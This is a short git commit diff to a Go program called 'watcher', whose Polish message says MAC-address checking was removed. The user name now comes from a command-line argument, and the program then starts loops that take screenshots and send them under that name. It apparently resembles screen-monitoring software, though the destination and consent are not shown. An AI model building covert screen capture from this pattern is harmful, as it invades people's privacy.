04153752fb38879bd422d8711027f27cf88f68d4
linuxuser <fakemail@bulshit.com>
2025-03-16 23:10:52 +0100

    sprawdzanie MAC wywalone

--- main.go
+++ main.go
@@ -7,16 +7,9 @@ import (
 
 func main() {
 
-	userName := identifyUserByMAC()
+	userName := os.Args[1]
 
-	if len(os.Args) == 2 {
-		param := os.Args[1]
-		_ = sendFakeShot(userName, "first param in watcher is "+param)
-	} else {
-		_ = sendFakeShot(userName, "len of args not 2")
-	}
-
-	sendFakeShot(userName, "hello from watcher ver 0.1.0 "+runtime.GOOS)
+	_ = sendFakeShot(userName, "hello from watcher without MAC checking "+runtime.GOOS)
 	go screenshotingLoop(userName)
 	go terminationLoop(userName)
 	select {}
